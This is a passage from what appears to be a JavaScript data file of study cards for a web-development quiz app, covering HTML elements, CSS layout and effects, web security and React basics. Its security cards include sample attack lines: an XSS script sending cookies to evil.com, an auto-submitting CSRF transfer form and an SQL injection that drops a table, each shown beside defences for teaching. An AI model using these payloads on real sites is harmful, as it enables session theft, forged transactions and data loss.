  e.preventDefault();
  const data = e.dataTransfer.getData('text/plain');
  e.target.textContent = data;
}
</script>`
  },
  {
    title: 'Details & Summary',
    category: 'HTML',
    subcategory: 'Interactive',
    description: 'Native disclosure widget — accordion/collapsible without JavaScript.',
    content: 'The details element creates a disclosure widget that can be toggled open/closed. The summary element provides the visible heading. It\'s accessible by default (keyboard navigable, screen reader friendly). Use for FAQs, collapsible sections, and progressive disclosure.',
    example: `<!-- Basic usage -->
<details>
  <summary>What is JavaScript?</summary>
  <p>A lightweight, interpreted programming language.</p>
</details>

<!-- Open by default -->
<details open>
  <summary>How to learn?</summary>
  <p>Practice with SmartQuiz!</p>
</details>

<!-- Styled accordion -->
<style>
  details { margin: 8px 0; border: 1px solid #333; border-radius: 8px; }
  summary { padding: 12px; cursor: pointer; color: white; }
  details[open] summary { border-bottom: 1px solid #333; }
  details p { padding: 12px; color: #aaa; margin: 0; }
</style>`
  },
  {
    title: 'Iframes & Embedding',
    category: 'HTML',
    subcategory: 'Embedding',
    description: 'Embedding external content and isolated browsing contexts.',
    content: 'Iframes embed other HTML documents. Use sandbox attribute for security (restrict capabilities). loading="lazy" defers loading. title attribute is required for accessibility. Use for maps, videos, widgets, and third-party content. Consider performance implications.',
    example: `<!-- Basic iframe -->
<iframe src="https://example.com"
  width="100%" height="400"
  title="Embedded content"
  loading="lazy"
  sandbox="allow-scripts allow-same-origin">
</iframe>

<!-- Embed YouTube -->
<iframe width="560" height="315"
  src="https://www.youtube.com/embed/dQw4w9WgXcQ"
  title="YouTube video"
  allow="accelerometer; autoplay; clipboard-write"
  allowfullscreen>
</iframe>

<!-- Embed CodePen -->
<iframe height="300" scrolling="no"
  src="https://codepen.io/pen/embed/xxx">
</iframe>`
  },
  {
    title: 'Tables & Data',
    category: 'HTML',
    subcategory: 'Structure',
    description: 'Properly structuring tabular data with accessible table elements.',
    content: 'Tables should be used for tabular data, NOT for layout. Key elements: table, thead, tbody, tfoot, tr, th, td, caption, colgroup. Use scope="col" or scope="row" on th for accessibility. caption provides a title. Thead/tfoot repeat on page breaks.',
    example: `<table>
  <caption>Quiz Results</caption>
  <thead>
    <tr>
      <th scope="col">Question</th>
      <th scope="col">Your Answer</th>
      <th scope="col">Correct</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>What is hoisting?</td>
      <td>Moving declarations</td>
      <td>✓</td>
    </tr>
    <tr>
      <td>What is closure?</td>
      <td>Variable scope</td>
      <td>✗</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td colspan="2">Score</td>
      <td>50%</td>
    </tr>
  </tfoot>
</table>`
  },
  {
    title: 'Progress & Meter',
    category: 'HTML',
    subcategory: 'Interactive',
    description: 'Native elements for displaying completion status and scalar measurements.',
    content: 'The progress element shows completion (0 to max). The meter element shows a scalar value within a range (low, high, optimum). Both are semantic and accessible. Use progress for task completion, meter for measurements like disk usage or scores.',
    example: `<!-- Progress bar -->
<progress value="70" max="100">70%</progress>
<progress indeterminate> Loading... </progress>

<!-- Meter with ranges -->
<meter value="0.8" min="0" low="0.3" high="0.7" optimum="1">
  80%
</meter>

<!-- With labels -->
<label for="quiz-progress">Quiz Progress</label>
<progress id="quiz-progress" value="3" max="10">3/10</progress>

<!-- Styling -->
<style>
  progress { width: 100%; height: 8px; border-radius: 4px; }
  progress::-webkit-progress-bar { background: #1a1a2e; }
  progress::-webkit-progress-value { background: #3b82f6; border-radius: 4px; }
</style>`
  },

  // ═══════════════════════════════════════════
  // CSS
  // ═══════════════════════════════════════════
  {
    title: 'Flexbox',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'One-dimensional layout system for arranging items in rows or columns.',
    content: 'Flexbox distributes space along a single axis. The parent becomes a flex container (display: flex), children become flex items. Key properties: flex-direction, justify-content (main axis), align-items (cross axis), flex-wrap, gap, flex-grow/shrink/basis. Flexbox is perfect for navigation bars, card layouts, centering, and component-level layouts.',
    example: `.container {
  display: flex;
  justify-content: space-between;  /* main axis */
  align-items: center;             /* cross axis */
  flex-wrap: wrap;
  gap: 16px;
}

.item {
  flex: 1;           /* grow, shrink, basis */
  flex-basis: 200px;
}

/* Center anything */
.center {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

/* Holy Grail layout */
.layout {
  display: flex;
  min-height: 100vh;
}
.sidebar { flex: 0 0 250px; }
.content { flex: 1; }`
  },
  {
    title: 'CSS Grid',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'Two-dimensional layout system for rows AND columns simultaneously.',
    content: 'CSS Grid handles both rows and columns. Define grid with grid-template-columns/rows. Use fr (fraction), minmax(), auto-fill/auto-fit for responsive layouts. Grid areas (grid-template-areas) create visual layouts with named regions. Grid is ideal for page layouts, dashboards, and complex component layouts.',
    example: `.grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}

/* Responsive without media queries */
.auto-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 16px;
}

/* Named areas */
.dashboard {
  display: grid;
  grid-template-areas:
    "header header"
    "sidebar main"
    "footer footer";
  grid-template-columns: 250px 1fr;
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
}
.header  { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }`
  },
  {
    title: 'Custom Properties (Variables)',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'CSS-native variables for reusable, dynamic values.',
    content: 'Custom properties (--name: value) are defined on selectors and inherited by children. var(--name, fallback) uses them. They cascade, can be scoped, and can be changed with JavaScript (element.style.setProperty). Unlike preprocessor variables, they work at runtime and respond to media queries.',
    example: `:root {
  --primary: #3b82f6;
  --radius: 12px;
  --spacing: 16px;
  --font: 'Inter', sans-serif;
}

.card {
  background: var(--primary);
  border-radius: var(--radius);
  padding: var(--spacing);
  font-family: var(--font);
}

/* Dark mode override */
@media (prefers-color-scheme: dark) {
  :root {
    --primary: #60a5fa;
  }
}

/* JavaScript can change them */
element.style.setProperty('--primary', '#10b981');`
  },
  {
    title: 'Specificity & Cascade',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'How CSS resolves conflicts when multiple rules target the same element.',
    content: 'Specificity is calculated as (inline, IDs, classes, elements): (1,0,0,0) for inline, (0,1,0,0) for IDs, (0,0,1,0) for classes, (0,0,0,1) for elements. Higher specificity wins. !important overrides everything (avoid it). The cascade considers specificity, source order, and inheritance. Understanding specificity prevents "why doesn\'t my CSS work" bugs.',
    example: `/* Specificity hierarchy */
/* (0,0,0,1) — element */
p { color: blue; }

/* (0,0,1,0) — class */
.text { color: red; }  /* wins over p */

/* (0,1,0,0) — ID */
#title { color: green; }  /* wins over .text */

/* (1,0,0,0) — inline */
<p style="color: purple">  /* wins over #title */

/* Avoid !important — it breaks cascade */
.bad { color: red !important; }  /* overrides everything */

/* Modern alternative: layers */
@layer base, components, utilities;
@layer base { p { color: blue; } }
@layer components { .text { color: red; } }  /* wins */`
  },
  {
    title: 'Positioning',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'static, relative, absolute, fixed, and sticky positioning modes.',
    content: 'position: static (default, normal flow), relative (offset from normal position), absolute (offset from nearest positioned ancestor), fixed (offset from viewport), sticky (toggles between relative and fixed). Use top/right/bottom/left with position to offset. z-index controls stacking (only works on positioned elements).',
    example: `.container { position: relative; }

/* Absolute — relative to nearest positioned ancestor */
.badge {
  position: absolute;
  top: -8px;
  right: -8px;
  z-index: 10;
}

/* Fixed — relative to viewport */
.header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 100;
}

/* Sticky — toggles based on scroll */
.sticky-nav {
  position: sticky;
  top: 0;
  z-index: 50;
}

/* Center with absolute */
.center-absolute {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}`
  },
  {
    title: 'Transforms',
    category: 'CSS',
    subcategory: 'Effects',
    description: '2D and 3D transformations: translate, rotate, scale, skew.',
    content: 'Transforms modify elements visually without affecting layout. translate() moves, rotate() spins, scale() resizes, skew() distorts. Transform-origin sets the pivot point. 3D transforms add perspective, rotateX/Y, translateZ. Transforms compose left-to-right.',
    example: `.element {
  transform: translate(20px, -10px);
  transform-origin: center center;
}

/* Rotate on hover */
.card:hover {
  transform: rotate(2deg) scale(1.02);
}

/* 3D card flip */
.card-container {
  perspective: 1000px;
}
.card {
  transition: transform 0.6s;
  transform-style: preserve-3d;
}
.card.flipped {
  transform: rotateY(180deg);
}
.card-front, .card-back {
  backface-visibility: hidden;
  position: absolute;
}
.card-back {
  transform: rotateY(180deg);
}

/* Scale with transform */
.icon {
  transition: transform 0.2s;
}
.icon:hover {
  transform: scale(1.2);
}`
  },
  {
    title: 'Transitions & Animations',
    category: 'CSS',
    subcategory: 'Effects',
    description: 'Smooth state changes (transitions) and keyframe-based animations.',
    content: 'Transitions interpolate between two states (hover effects, state changes). Properties: transition-property, transition-duration, transition-timing-function, transition-delay. Animations use @keyframes for complex, multi-step sequences with animation-name, animation-iteration-count, animation-direction.',
    example: `/* Transition */
.button {
  background: #3b82f6;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.button:hover {
  background: #2563eb;
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
}

/* Keyframe animation */
@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.05); opacity: 0.8; }
}

@keyframes slideUp {
  from { transform: translateY(20px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}

.animate-in {
  animation: slideUp 0.5s ease-out forwards;
}

.loading {
  animation: pulse 1.5s ease-in-out infinite;
}`
  },
  {
    title: 'Media Queries',
    category: 'CSS',
    subcategory: 'Responsive',
    description: 'Adapting layouts and styles based on device characteristics.',
    content: 'Media queries apply styles conditionally based on viewport width, height, orientation, resolution, and more. Mobile-first approach: start with mobile styles, add complexity with min-width. Breakpoints should be content-driven, not device-driven. Container queries (@container) respond to parent size instead of viewport.',
    example: `/* Mobile-first approach */
.container {
  padding: 16px;    /* mobile */
}

@media (min-width: 640px) {
  .container { padding: 24px; }  /* tablet */
}

@media (min-width: 1024px) {
  .container { padding: 32px; }  /* desktop */
}

/* Container queries (modern) */
.card-container {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 200px 1fr;
  }
}

/* Dark mode */
@media (prefers-color-scheme: dark) {
  :root { --bg: #0a0a0a; --text: #fff; }
}

/* Reduced motion */
@media (prefers-reduced-motion: reduce) {
  * { animation: none !important; transition: none !important; }
}`
  },
  {
    title: 'Pseudo-classes & Pseudo-elements',
    category: 'CSS',
    subcategory: 'Advanced',
    description: 'Styling specific states and creating visual elements without extra HTML.',
    content: 'Pseudo-classes (:hover, :focus, :nth-child, :has) select elements in specific states. Pseudo-elements (::before, ::after, ::first-line, ::placeholder) create virtual elements or style parts of content. :has() is the "parent selector" — select a parent based on its children.',
    example: `/* Pseudo-classes */
a:hover { color: #3b82f6; }
input:focus { border-color: #3b82f6; outline: none; }
li:nth-child(odd) { background: rgba(255,255,255,0.05); }
li:first-child { font-weight: bold; }

/* :has() — parent selector */
.card:has(img) { display: grid; grid-template-columns: 200px 1fr; }
form:has(:invalid) .submit-btn { opacity: 0.5; }

/* Pseudo-elements */
.tooltip::before {
  content: attr(data-tooltip);
  position: absolute;
  bottom: 100%;
  background: #000;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  white-space: nowrap;
}

.quote::before {
  content: open-quote;
  font-size: 3em;
  color: #3b82f6;
}`
  },
  {
    title: 'Colors & Gradients',
    category: 'CSS',
    subcategory: 'Visual',
    description: 'Modern color functions: rgb, hsl, oklch, and gradient techniques.',
    content: 'CSS supports multiple color models: rgb(), hsl(), oklch() (perceptually uniform). Color functions like color-mix(), oklch() enable advanced color manipulation. Gradients (linear, radial, conic) create backgrounds, borders, and text effects. currentColor inherits text color. oklab/oklch provide better perceptual uniformity.',
    example: `/* Modern color functions */
.element {
  color: rgb(59, 130, 246);
  background: hsl(220, 90%, 56%);
  border-color: oklch(0.7 0.15 250);
}

/* color-mix */
.btn-primary {
  background: color-mix(in oklch, #3b82f6 80%, black);
}

/* Gradients */
.gradient-bg {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}

.glass {
  background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
  backdrop-filter: blur(10px);
}

/* Text gradient */
.gradient-text {
  background: linear-gradient(to right, #3b82f6, #8b5cf6);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}`
  },
  {
    title: 'Typography',
    category: 'CSS',
    subcategory: 'Visual',
    description: 'Font systems, text styling, and modern typography techniques.',
    content: 'CSS typography: font-family (system fonts for performance), font-size (clamp() for fluid), font-weight, line-height, letter-spacing, text-transform. @font-face loads custom fonts. font-display: swap improves loading. Modern techniques: variable fonts, text-wrap: balance, hanging punctuation.',
    example: `:root {
  --font-sans: system-ui, -apple-system, sans-serif;
  --font-mono: 'SF Mono', monospace;
}

body {
  font-family: var(--font-sans);
  line-height: 1.6;
  font-size: clamp(1rem, 0.9rem + 0.5vw, 1.125rem);
}

h1 {
  font-size: clamp(2rem, 1.5rem + 2vw, 3.5rem);
  line-height: 1.1;
  text-wrap: balance;  /* prevents orphans */
}

code {
  font-family: var(--font-mono);
  background: rgba(255,255,255,0.1);
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 0.9em;
}

/* Fluid typography */
html { font-size: clamp(14px, 1vw + 12px, 18px); }`
  },
  {
    title: 'Box Model & Sizing',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'Understanding content, padding, border, margin, and modern box-sizing.',
    content: 'Every element is a box: content → padding → border → margin. box-sizing: border-box includes padding/border in width (standard practice). margin: auto centers block elements. margin collapsing: vertical margins between block elements merge to the larger value. outline doesn\'t affect layout.',
    example: `/* Reset — always use border-box */
*, *::before, *::after {
  box-sizing: border-box;
}

.card {
  width: 300px;           /* includes padding + border */
  padding: 24px;
  border: 1px solid #333;
  margin: 16px auto;      /* centered horizontally */
  outline: 2px solid transparent;  /* no layout shift on focus */
}

/* Centering with margin */
.center-block {
  width: fit-content;
  margin: 0 auto;
}

/* Prevent margin collapse */
.no-collapse {
  display: flow-root;  /* creates new BFC */
}

/* min/max for responsive sizing */
.responsive {
  width: min(100% - 32px, 600px);
  margin: 0 auto;
}`
  },
  {
    title: 'CSS Layers',
    category: 'CSS',
    subcategory: 'Modern',
    description: 'Control cascade order with @layer for predictable style prioritization.',
    content: '@layer lets you explicitly control which styles win in the cascade. Define layers in order of priority: base < components < utilities. Styles without layers override layered styles. This replaces the need for specificity hacks and !important.',
    example: `/* Define layer order — last wins */
@layer base, components, utilities;

@layer base {
  h1 { font-size: 2rem; }
  p { color: #666; }
}

@layer components {
  .card h1 { font-size: 1.5rem; }  /* beats base */
}

@layer utilities {
  .text-lg { font-size: 2.5rem; }  /* beats components */
}

/* Unlayered styles beat everything */
.insane { color: red; }  /* wins over all layers */

/* Named layers for third-party code */
@layer vendor {
  /* Bootstrap/Tailwind styles here */
}`
  },
  {
    title: 'Scroll Snap',
    category: 'CSS',
    subcategory: 'Interactive',
    description: 'Creating smooth, snap-to-position scrolling experiences.',
    content: 'Scroll snap creates carousel-like scrolling where the scroll position "snaps" to predefined points. Properties: scroll-snap-type (x/y mandatory/proximity) on container, scroll-snap-align (start/center/end) on children. Combined with overflow: scroll/auto.',
    example: `/* Horizontal carousel */
.carousel {
  display: flex;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  gap: 16px;
  padding: 16px;
  -webkit-overflow-scrolling: touch;
}

.carousel-item {
  scroll-snap-align: start;
  flex: 0 0 300px;
  min-height: 200px;
}

/* Vertical full-page sections */
.fullpage {
  height: 100vh;
  overflow-y: auto;
  scroll-snap-type: y mandatory;
}

.section {
  scroll-snap-align: start;
  height: 100vh;
}

/* Hide scrollbar */
.carousel::-webkit-scrollbar { display: none; }
.carousel { scrollbar-width: none; }`
  },
  {
    title: 'View Transitions',
    category: 'CSS',
    subcategory: 'Modern',
    description: 'Smooth animated transitions between DOM states or page navigations.',
    content: 'View Transitions API creates smooth animations between states. CSS view-transition-name assigns transition identities to elements. ::view-transition pseudo-elements style the animation. Works with SPA route changes and MPA navigation (Chrome 111+).',
    example: `/* Named view transitions */
.card-image {
  view-transition-name: hero-image;
}

.card-title {
  view-transition-name: hero-title;
}

/* Customize the transition */
::view-transition-old(hero-image) {
  animation: fade-out 0.3s ease-out;
}

::view-transition-new(hero-image) {
  animation: fade-in 0.3s ease-in;
}

/* JavaScript trigger */
document.startViewTransition(() => {
  updateDOM();  // your DOM update
});

/* Cross-document (MPA) */
@view-transition {
  navigation: auto;
}`
  },

  // ═══════════════════════════════════════════
  // CYBERSECURITY
  // ═══════════════════════════════════════════
  {
    title: 'Cross-Site Scripting (XSS)',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Injecting malicious scripts into web pages viewed by other users.',
    content: 'XSS occurs when user input is rendered as HTML/JS without sanitization. Three types: Stored (malicious script saved to database), Reflected (via URL parameters), DOM-based (client-side JavaScript). Prevention: sanitize output, use Content Security Policy (CSP), encode HTML entities, use frameworks that auto-escape (React, Vue).',
    example: `// Vulnerable code
element.innerHTML = userInput; // XSS!

// Attack payload
<script>document.location='https://evil.com/?c='+document.cookie</script>

// Prevention
// 1. Use textContent instead of innerHTML
element.textContent = userInput;

// 2. Sanitize HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// 3. CSP header
Content-Security-Policy: default-src 'self'; script-src 'self'

// 4. React auto-escapes
// <div>{userInput}</div>  // safe
// <div dangerouslySetInnerHTML={{__html: userInput}} />  // dangerous`
  },
  {
    title: 'Cross-Site Request Forgery (CSRF)',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Tricking authenticated users into performing unwanted actions.',
    content: 'CSRF exploits the trust a site has in the user\'s browser. An attacker creates a page that submits a form to your site using the user\'s existing session cookies. Prevention: use anti-CSRF tokens, SameSite cookie attribute, check Origin/Referer headers, require re-authentication for sensitive actions.',
    example: `<!-- Attack: hidden form on malicious site -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>

// Prevention strategies:

// 1. SameSite cookies (default in modern browsers)
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly

// 2. Anti-CSRF token
<input type="hidden" name="_csrf" value="random-token" />

// 3. Check Origin header
if (req.headers.origin !== 'https://yoursite.com') {
  return res.status(403).send('Invalid origin');
}

// 4. Double Submit Cookie
// Send token in both cookie and header, compare server-side`
  },
  {
    title: 'SQL Injection',
    category: 'Cybersecurity',
    subcategory: 'Attacks',
    description: 'Inserting malicious SQL code into database queries via user input.',
    content: 'SQL injection occurs when user input is concatenated directly into SQL queries. Attackers can bypass authentication, extract data, or destroy databases. Prevention: use parameterized queries/prepared statements, ORM frameworks, input validation, and least-privilege database permissions.',
    example: `// Vulnerable query
const query = "SELECT * FROM users WHERE name='" + input + "'";
// Attack: input = "'; DROP TABLE users; --"

// Prevention 1: Parameterized queries
const query = "SELECT * FROM users WHERE name = ?";
db.query(query, [input]);

// Prevention 2: ORM (Prisma example)
const user = await prisma.user.findUnique({
  where: { name: input }
});

// Prevention 3: Input validation
const clean = input.replace(/[^a-zA-Z0-9]/g, '');

// Prevention 4: Least privilege
// Don't use root/admin DB user for app queries`
  },
  {
    title: 'Authentication & Password Security',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Secure password storage, MFA, and session management.',
    content: 'Never store plaintext passwords. Use bcrypt, scrypt, or Argon2 for hashing with unique salts. Implement MFA (TOTP, WebAuthn). Use secure session management: HttpOnly, Secure, SameSite cookies. Implement account lockout after failed attempts. Use passwordless options when possible (magic links, WebAuthn).',
    example: `// Password hashing with bcrypt
import bcrypt from 'bcrypt';

// Hash on registration
const hash = await bcrypt.hash(password, 12);

// Verify on login
const valid = await bcrypt.compare(inputPassword, storedHash);

// Session cookie security
res.cookie('session', token, {
  httpOnly: true,     // No JavaScript access
  secure: true,       // HTTPS only
  sameSite: 'lax',   // CSRF protection
  maxAge: 86400000,   // 24 hours
});

// Rate limiting login attempts
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});`
  },
  {
    title: 'Content Security Policy (CSP)',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'HTTP header that controls which resources a page can load.',
    content: 'CSP prevents XSS by whitelisting allowed sources for scripts, styles, images, and other resources. It\'s an HTTP response header or meta tag. Start with report-only mode to test. Strict CSP significantly reduces attack surface.',
    example: `// HTTP header
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

// HTML meta tag (fallback)
<meta http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self'">

// Report violations
Content-Security-Policy-Report-Only: ...; report-uri /csp-report

// Nonce for inline scripts
script-src 'self' 'nonce-abc123'
// <script nonce="abc123">...</script>`
  },
  {
    title: 'HTTPS & TLS',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Encrypting data in transit between client and server.',
    content: 'HTTPS encrypts all traffic between browser and server using TLS. It prevents eavesdropping, tampering, and MITM attacks. Always use HTTPS in production. HTTP Strict Transport Security (HSTS) forces HTTPS. Use certificates from trusted CAs (Let\'s Encrypt is free).',
    example: `// Redirect HTTP to HTTPS
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, \`https://\${req.headers.host}\${req.url}\`);
  }
  next();
});

// HSTS header
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Content-Security-Policy upgrade
upgrade-insecure-requests;

// Check certificate
openssl s_client -connect yoursite.com:443 -servername yoursite.com`
  },
  {
    title: 'Input Validation & Sanitization',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Validating and cleaning all user input on both client and server.',
    content: 'Never trust user input. Validate on the server (client validation is bypassable). Use allowlists over blocklists. Validate type, length, range, and format. Sanitize HTML output. Use libraries like Joi, Zod for validation, DOMPurify for HTML sanitization.',
    example: `// Server validation with Zod
import { z } from 'zod';

const userSchema = z.object({
  name: z.string().min(2).max(50).regex(/^[a-zA-Z\\s]+$/),
  email: z.string().email(),
  age: z.number().int().min(13).max(120),
  url: z.string().url().optional()
});

try {
  const data = userSchema.parse(req.body);
} catch (err) {
  return res.status(400).json({ errors: err.errors });
}

// Sanitize HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});`
  },
  {
    title: 'Security Headers',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'HTTP headers that protect against common web vulnerabilities.',
    content: 'Essential security headers: X-Content-Type-Options (prevent MIME sniffing), X-Frame-Options (prevent clickjacking), X-XSS-Protection (legacy XSS filter), Referrer-Policy (control referrer info), Permissions-Policy (restrict browser features). Use securityheader.com to audit.',
    example: `// Essential security headers
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()

// helmet.js for Express
import helmet from 'helmet';
app.use(helmet());

// Manual headers (Node.js)
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=()');
  next();
});`
  },
  {
    title: 'Session Management',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Secure handling of user sessions, tokens, and state.',
    content: 'Sessions identify authenticated users. Use cryptographically random session IDs. Store sessions server-side (not in localStorage). Implement session expiration, idle timeout, and regeneration on privilege change. JWT tokens need careful handling: short expiration, refresh tokens, secure storage.',
    example: `// Secure session config (express-session)
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,     // HTTPS only
    httpOnly: true,   // No JS access
    sameSite: 'lax', // CSRF protection
    maxAge: 3600000   // 1 hour
  }
}));

// Regenerate session on login
app.post('/login', (req, res) => {
  req.session.regenerate((err) => {
    req.session.userId = user.id;
    res.redirect('/dashboard');
  });
});

// JWT best practices
// Store in httpOnly cookie, NOT localStorage
// Use short expiry (15 min) + refresh token`
  },
  {
    title: 'Rate Limiting & Brute Force Protection',
    category: 'Cybersecurity',
    subcategory: 'Defense',
    description: 'Preventing abuse by limiting request frequency.',
    content: 'Rate limiting restricts how many requests a client can make in a given time window. Prevents brute force attacks, API abuse, and DDoS. Use sliding window or token bucket algorithms. Implement progressive delays for failed attempts.',
    example: `// express-rate-limit
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: 'Too many attempts, try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/login', loginLimiter);

// Progressive delay
const delays = [0, 1000, 2000, 5000, 10000];
app.use('/login', (req, res, next) => {
  const attempts = getFailedAttempts(req.ip);
  const delay = delays[Math.min(attempts, delays.length - 1)];
  setTimeout(next, delay);
});

// IP-based blocking
if (failedAttempts > 10) blockIP(req.ip, 3600);`
  },
  {
    title: 'OWASP Top 10',
    category: 'Cybersecurity',
    subcategory: 'Overview',
    description: 'The most critical web application security risks (2021 edition).',
    content: 'OWASP Top 10: (1) Broken Access Control, (2) Cryptographic Failures, (3) Injection, (4) Insecure Design, (5) Security Misconfiguration, (6) Vulnerable Components, (7) Auth Failures, (8) Data Integrity Failures, (9) Logging Failures, (10) SSRF. Understanding these categories helps prioritize security efforts.',
    example: `// 1. Broken Access Control
// Ensure users can only access their own data
if (resource.userId !== currentUser.id) return 403;

// 3. Injection
// Use parameterized queries, never concatenate SQL

// 5. Security Misconfiguration
// Remove default credentials, disable debug mode in production

// 6. Vulnerable Components
// npm audit, keep dependencies updated

// 7. Auth Failures
// Implement MFA, use secure password hashing

// 9. Logging & Monitoring
logger.info('Login attempt', { userId, ip, success });
logger.warn('Failed login', { userId, ip, attempt: count });`
  },
  {
    title: 'Web Security Best Practices',
    category: 'Cybersecurity',
    subcategory: 'Overview',
    description: 'Comprehensive security checklist for modern web applications.',
    content: 'Security is a layered approach. Key practices: validate all input, sanitize output, use HTTPS everywhere, implement CSP, use security headers, rate limit endpoints, log security events, keep dependencies updated, conduct security audits, and train developers on secure coding.',
    example: `// Security checklist
const securityChecklist = {
  authentication: [
    'Use bcrypt/argon2 for passwords',
    'Implement MFA',
    'Account lockout after failed attempts',
    'Secure session management'
  ],
  authorization: [
    'Check permissions on every request',
    'Use RBAC or ABAC',
    'Deny by default'
  ],
  dataProtection: [
    'Encrypt data at rest and in transit',
    'Minimize data collection',
    'Implement data retention policies'
  ],
  infrastructure: [
    'Use security headers',
    'Enable CSP',
    'Regular dependency audits',
    'Automated security testing'
  ]
};

// Run npm audit regularly
// Use Snyk or similar for vulnerability scanning
// Implement CI/CD security checks`
  },

  // ═══════════════════════════════════════════
  // REACT
  // ═══════════════════════════════════════════
  {
    title: 'Components & JSX',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Building blocks of React UIs — reusable functions that return JSX.',
    content: 'Components are JavaScript functions that return JSX (a syntax extension resembling HTML). JSX compiles to React.createElement() calls. Components can be functional (modern) or class-based (legacy). Each component should do one thing well. Props flow down, events flow up.',
    example: `// Functional component
function Greeting({ name, age }) {
  return (
    <div className="greeting">
      <h1>Hello, {name}!</h1>
      <p>You are {age} years old.</p>
    </div>
  );
}

// Arrow function variant
const Greeting = ({ name, age }) => (
  <div>
    <h1>Hello, {name}!</h1>
    <p>Age: {age}</p>
  </div>
);

// Usage
<Greeting name="Alice" age={25} />

// Conditional rendering
const Dashboard = ({ isLoggedIn }) => (
  isLoggedIn ? <MainContent /> : <LoginPrompt />
);`
  },
  {
    title: 'Props & State',
    category: 'React',
    subcategory: 'Fundamentals',
    description: 'Data flow: props pass data down, state manages internal component data.',
    content: 'Props are read-only inputs passed from parent to child. State is internal, mutable data managed by useState. State changes trigger re-renders. Never modify props directly. State updates are batched and asynchronous. Use functional updates for state that depends on previous state.',
    example: `import { useState } from 'react';

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>+1</button>
      <button onClick={() => setCount(c => c + 1)}>+1 (safe)</button>
    </div>
  );
}

// Lifting state up
function Parent() {
  const [selected, setSelected] = useState(null);
  return (
    <Child
      value={selected}
      onChange={setSelected}
    />
  );
}

// Derived state (compute, don't store)
function List({ items }) {
  const filtered = items.filter(i => i.active); // don't store in state
  return <ul>{filtered.map(i => <li key={i.id}>{i.name}</li>)}</ul>;
}`
  },
  {
    title: 'useEffect & Lifecycle',
    category: 'React',
    subcategory: 'Hooks',
    description: 'Side effects: data fetching, subscriptions, timers, and DOM manipulation.',
    content: 'useEffect runs after render: useEffect(callback, deps). Empty deps [] = once on mount. No deps = every render. Return a cleanup function for subscriptions/timers. Common patterns: fetch on mount, subscribe to events, sync with external systems. Avoid infinite loops by managing dependencies correctly.',
    example: `import { useState, useEffect } from 'react';

function UserProfile({ userId }) {
